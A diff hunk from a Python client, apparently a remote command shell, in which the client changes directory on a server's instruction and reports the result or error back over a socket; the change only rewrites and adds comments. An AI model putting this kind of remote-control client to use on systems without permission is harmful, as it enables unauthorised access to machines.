@@ -293,9 +293,10 @@ def main():
                     data = '\n[!] Changed directory to: {}'.format(os.getcwd())
                     mysendall(mysocket, data.encode(), delimiter)
                 except Exception as e:
-                    # We tell the server there was no directory provided
+                    # We tell the server there was an error
                     data = '[!] ERROR: '+str(e)
                     data = data.encode()
+                    # We send the error to the server
                     mysendall(mysocket, data, delimiter)
                     # Now we sync the server with the client
                     myrecvall(mysocket, delimiter).decode()
